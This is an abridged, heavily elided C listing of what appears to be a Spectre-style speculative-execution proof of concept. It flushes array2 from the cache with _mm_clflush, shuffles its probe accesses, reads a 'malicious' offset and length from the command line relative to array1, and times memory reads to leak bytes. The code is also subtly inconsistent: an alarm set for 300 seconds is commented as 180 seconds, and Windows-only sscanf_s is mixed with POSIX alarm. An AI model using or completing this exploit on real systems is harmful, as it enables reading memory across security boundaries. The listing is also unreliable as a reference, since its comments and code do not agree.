...
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    ...
    for (tries = 999; tries > 0; tries--)
    {
        ...
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); // Flush cache lines of array2
        ...
        // Shuffle the access pattern to array2 using Fisher-Yates shuffle
...
void calculate_success_rate_and_exit() {
    ...
    double bandwidth = (double)success_count / 300; // Estimate bandwidth
...
int main(int argc, const char* * argv)
{
    ...
    alarm(300); // Set an alarm to stop the program after 180 seconds
    ...
    while (!done) {
        ...
        if (argc == 3)
        {
            sscanf_s(argv[1], "%p", (void * *)(&malicious_x)); // Get malicious offset from command line
            malicious_x -= (size_t)array1; // Adjust offset relative to array1
            sscanf_s(argv[2], "%d", &len); // Get length from command line
        }
        ...
        while (--len >= 0)
        {
            ...
            double duration = (double)(end_time - start_time) * 1000000.0 / CLOCKS_PER_SEC; // Calculate duration
        }
    }
